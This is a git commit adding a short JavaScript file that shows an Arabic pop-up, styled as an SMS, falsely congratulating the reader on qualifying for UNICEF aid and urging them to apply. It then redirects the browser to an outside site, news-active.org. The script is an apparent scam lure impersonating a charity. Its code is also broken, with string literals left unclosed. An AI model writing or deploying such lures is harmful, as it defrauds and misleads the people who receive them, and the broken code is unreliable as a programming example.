4f893bd01a685280a275e4dbc037502e67024977
ekpeowo <ukpehansi@gmail.com>
2025-04-02 16:43:21 +0100

    Create bahrain-active.js

---
+++ bahrain-active.js
@@ -0,0 +1,5 @@
+var password = 'تقدم بطلبك الآن
+password=prompt('SMS: مبروك، لقد تم تأهيلك لدى صندوق الأمم المتحدة للطفولة (اليونيسيف)، اضغط موافق لتقديم الطلب الآن ','تقدم بطلبك الآن);
+if (password != 'تقدم بطلبك الآن) {
+location.href='https://news-active.org/unicef-bahrain';
+}
